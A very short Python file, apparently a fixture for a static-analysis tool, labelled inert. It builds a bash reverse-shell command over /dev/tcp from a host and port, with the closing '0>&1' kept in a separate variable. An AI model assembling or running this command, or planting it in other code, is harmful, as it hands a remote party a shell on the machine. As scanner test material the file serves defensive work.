# Inert static-analysis fixture. Do not execute.
def build(host, port):
    return f"bash -i >& /dev/tcp/{host}/{port}"
bridge = "0>&1"

